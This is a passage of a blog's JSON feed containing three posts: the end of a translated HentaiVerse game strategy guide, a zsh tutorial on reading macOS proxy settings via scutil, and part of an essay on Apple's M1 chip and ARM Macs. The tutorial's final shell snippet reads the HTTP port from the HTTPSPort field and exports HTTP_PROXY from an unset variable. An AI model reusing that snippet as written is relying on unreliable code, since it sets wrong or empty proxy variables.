干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">[译] HentaiVerse 建议和指导</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\"> <div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-07</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 